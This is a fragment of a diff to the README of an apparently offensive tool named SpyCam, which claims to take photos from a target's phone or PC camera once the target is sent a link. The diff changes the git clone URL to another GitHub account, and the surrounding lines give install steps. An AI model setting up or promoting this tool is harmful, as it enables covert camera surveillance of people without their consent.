@@ -5,7 +5,7 @@ Take camshots from target's mobile phone front camera or PC webcam by just sendi
 
 ```
 1. sudo apt update && sudo apt upgrade
-2. git clone https://github.com/JBayudz/SpyCam.git
+2. git clone https://github.com/SoulCalibre003/SpyCam.git
 3. cd SpyCam
 4. sudo apt install php && sudo apt install unzip && sudo add-apt-repository ppa:yorba/ppa
 5. chmod +x *.sh
